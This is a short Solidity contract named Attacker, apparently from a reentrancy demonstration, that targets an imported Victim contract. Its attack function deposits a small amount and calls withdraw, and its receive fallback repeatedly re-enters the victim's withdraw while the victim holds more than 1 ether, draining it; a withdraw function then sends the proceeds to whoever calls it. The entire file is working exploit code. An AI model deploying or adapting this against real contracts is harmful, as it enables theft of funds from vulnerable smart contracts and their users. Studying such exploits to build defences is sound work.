//SPDX-License-Identifier: MIT

pragma solidity ^0.7.6;

import './Victim.sol';

contract Attacker{
    Victim public victim;

    constructor (address _victim){
        victim = Victim(_victim);
    }

    receive() external payable{
        if(address(victim).balance>1 ether){
            victim.withdraw();
        }
    }

   function attack() public payable {
        require(msg.value == 0.001 ether, "Send the required attack amount");
        victim.deposit{value: 0.001 ether}(); // Deposit some Ether to the Store contract
        victim.withdraw();
    }

    function withdraw() public{
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to withdraw Ether");

    }

}
